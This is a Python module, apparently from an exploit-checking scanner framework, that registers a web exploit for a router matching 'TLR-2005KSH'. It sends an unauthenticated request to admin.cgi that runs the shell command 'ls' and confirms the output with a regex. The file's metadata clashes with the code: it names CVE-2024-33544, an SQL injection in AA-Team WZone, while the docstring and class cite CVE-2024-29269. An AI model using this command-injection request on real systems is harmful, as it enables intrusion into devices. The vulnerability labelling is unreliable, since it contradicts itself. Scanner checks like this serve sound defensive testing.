"""Agent Asteroid implementation for CVE-2024-29269"""

import re

from agent import definitions
from agent import exploits_registry
from agent.exploits import webexploit

VULNERABILITY_TITLE = "SQL Injection in AA-Team WZone "
VULNERABILITY_REFERENCE = "CVE-2024-33544"
VULNERABILITY_DESCRIPTION = (
    "Improper Neutralization of Special Elements used in an SQL Command in AA-Team WZone allows SQL Injection."
    "This issue affects WZone: from n/a through 14.0.10."
)
RISK_RATING = "CRITICAL"


@exploits_registry.register
class CVE202429269Exploit(webexploit.WebExploit):
    accept_request = definitions.Request(method="GET", path="/")
    check_request = definitions.Request(
        method="GET", path="/cgi-bin/admin.cgi?Command=sysCommand&Cmd=ls"
    )
    accept_pattern = [re.compile("TLR-2005KSH")]
    match_pattern = [
        re.compile("<CmdResult><!\[CDATA\[systemutil.cgi\n\]\]></CmdResult>")
    ]
    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
    )
